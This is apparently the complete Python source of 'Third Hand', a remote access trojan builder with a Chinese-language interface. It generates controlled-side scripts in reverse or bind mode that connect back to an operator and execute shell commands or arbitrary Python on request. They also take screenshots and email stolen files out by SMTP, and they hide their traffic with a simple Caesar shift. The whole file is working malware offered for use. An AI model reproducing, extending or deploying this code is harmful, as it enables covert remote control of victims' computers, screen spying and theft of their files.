# coding=utf-8
import socket

def Caesar(i,string1):
    string2 = ''
    if i == 0:
        for a in string1:string2 = string2 + chr(ord(a)+4)
    elif i == 1:
        for a in string1:string2 = string2 + chr(ord(a)-4)
    return string2
a1 = """
t = socket.socket()
t.bind(("",%s))
t.listen(1)
print("正在监听此端口")
c,ip = t.accept()
while True:
    cmd = input('$>')
    if cmd == '':print('')
    else:
        c.send(Caesar(0,cmd).encode("gbk"))
        print(Caesar(1,c.recv(2048).decode("gbk")))
c.close()
t.close()
"""
a2 = """
t = socket.socket()
t.connect(("%s",%s))
while True:
    cmd = input("$>")
    if cmd == "":print("")
    else:
        t.send(Caesar(0,cmd).encode("gbk"))
        print(Caesar(1,t.recv(2048).decode("gbk")))
t.close()
"""
b1 = """
# coding=utf-8
import socket,smtplib,subprocess
from os import remove
from tkinter import Tk
from PIL import ImageGrab
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
host = ""
port = ""
name = ""
password = ""
def Caesar(i,string1):
    string2 = ""
    if i == 0:
        for a in string1:string2 = string2 + chr(ord(a)+4)
    elif i == 1:
        for a in string1:string2 = string2 + chr(ord(a)-4)
    return string2
def Shell(cmd):
    shell = subprocess.Popen(cmd,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
    out = shell.stdout.read().decode("gbk")
    err = shell.stderr.read().decode("gbk")
    if out == "" and err == "":
        out = " "
    return out+err
def Get(file1):
    msg = MIMEMultipart()
    file = MIMEText(open(file1,"rb").read(),"base64","utf-8")
    file["Content-Type"] = "application/octet-stream"
    file["Content-Disposition"] = "attachment;filename = " + file1
    msg.attach(file)
    smtp = smtplib.SMTP()
    smtp.connect(host,port)
    smtp.login(name,password)
    smtp.sendmail(name,name,msg.as_string())
    smtp.close()
    return "OK"
def Win():
    windown = Tk()
    jpg = ImageGrab.grab((0,0,int(windown.winfo_screenwidth()),int(windown.winfo_screenheight())))
    jpg.save("./.win.jpg")
    ret = Get("./.win.jpg")
    remove("./.win.jpg")
if "__main__" == __name__:
    t = socket.socket()
    try:
        t.connect(("%s",%s))
        while True:
            cmd = Caesar(1,t.recv(2048).decode("gbk")).split(" ",1)
            if cmd[0] == "shell":
                t.send(Caesar(0,Shell(cmd[1])).encode("gbk"))
            elif cmd[0] == "get":
                t.send(Caesar(0,Get(cmd[1])).encode("gbk"))
            elif cmd[0] == "win":
                t.send(Caesar(0,Win()).encode("gbk"))
            elif cmd[0] == "py":
                exec(cmd[1])
                t.send(Caesar(0,"OK").encode("gbk"))
        t.close()
    except:
        exit()
"""
b2 = """
# coding=utf-8
import socket,smtplib,subprocess
from os import remove
from tkinter import Tk
from PIL import ImageGrab
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
host = ""
port = ""
name = ""
password = ""
def Caesar(i,string1):
    string2 = ""
    if i == 0:
        for a in string1:string2 = string2 + chr(ord(a)+4)
    elif i == 1:
        for a in string1:string2 = string2 + chr(ord(a)-4)
    return string2
def Shell(cmd):#执行shell
    shell = subprocess.Popen(cmd,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
    out = shell.stdout.read().decode("gbk")
    err = shell.stderr.read().decode("gbk")
    if out == "" and err == "":
        out = " "
    return out+err
def Get(file1):
    msg = MIMEMultipart()
    file = MIMEText(open(file1,"rb").read(),"base64","utf-8")
    file["Content-Type"] = "application/octet-stream"
    file["Content-Disposition"] = "attachment;filename = " + file1
    msg.attach(file)
    smtp = smtplib.SMTP()
    smtp.connect(host,port)
    smtp.login(name,password)
    smtp.sendmail(name,name,msg.as_string())
    smtp.close()
    return "OK"
def Win():
    windown = Tk()
    jpg = ImageGrab.grab((0,0,int(windown.winfo_screenwidth()),int(windown.winfo_screenheight())))
    jpg.save("./.win.jpg")
    ret = Get("./.win.jpg")
    remove("./.win.jpg")
if "__main__" == __name__:
    t = socket.socket()
    t.bind(("",%s))
    t.listen(1)
    c,ip = t.accept()
    while True:
        cmd = Caesar(1,c.recv(2048).decode("gbk")).split(" ",1)
        if cmd[0] == "shell":
            c.send(Caesar(0,Shell(cmd[1])).encode("gbk"))
        elif cmd[0] == "get":
            c.send(Caesar(0,Get(cmd[1])).encode("gbk"))
        elif cmd[0] == "win":
            c.send(Caesar(0,Win()).encode("gbk"))
        elif cmd[0] == "py":
            exec(cmd[1])
            c.send(Caesar(0,"OK").encode("gbk"))
    c.close()
    t.close()
"""

if "__main__" == __name__:
    print("""
     _____ _     _         _   _   _                 _ 
    |_   _| |__ (_)_ __ __| | | | | | __ _ _ __   __| |
      | | | '_ \| | '__/ _` | | |_| |/ _` | '_ \ / _` |
      | | | | | | | | | (_| | |  _  | (_| | | | | (_| |
      |_| |_| |_|_|_|  \__,_| |_| |_|\__,_|_| |_|\__,_|
                                                
                                                V 1.0
    """)
    while True:
        cmd = input("Third-Hand $>").split()
        if cmd[0] == "help":
            print("""
            help                   显示帮助信息
            create [模式] [路径]    生成被控端脚本
            connect [模式]         连接被控端脚本
            exit                   退出

            模式有 1 与 2 两种
            1 —— 反向连接
            2 —— 正向连接
            """) 
        elif cmd[0] == "create":
            if cmd[1] == "1":
                file = open(cmd[2],"w+")
                file.write(b1 % (input("本机的IP>"),input("本机的某个port>")))
                file.close()
            elif cmd[1] == "2":
                file = open(cmd[2],"w+")
                file.write(b2 % (input("被控端的某个port>")))
                file.close()
            else:
                print("create无%s此参数" % cmd[1])
        elif cmd[0] == "connect":
            if cmd[1] == "1":
                exec(a1 % input("本机的某个port(与被控端相同)>"))
            elif cmd[1] == "2":
                exec(a2 % (input("被控端的IP>"),input("被控端的port>")))
            else:
                print("connecet无%s此参数" % cmd[1])
        elif cmd[0] == "exit":
            print("""
                ____                   _                
               / ___| ___   ___   __ _| |__  _   _  ___ 
              | |  _ / _ \ / _ \ / _` | '_ \| | | |/ _ |
              | |_| | (_) | (_) | (_| | |_) | |_| |  __/
               \____|\___/ \___/ \__, |_.__/ \__, |\___|
                                 |___/       |___/      
            """)
            exit()
        else:
            print("Third Hand无%s此命令" % cmd[0])
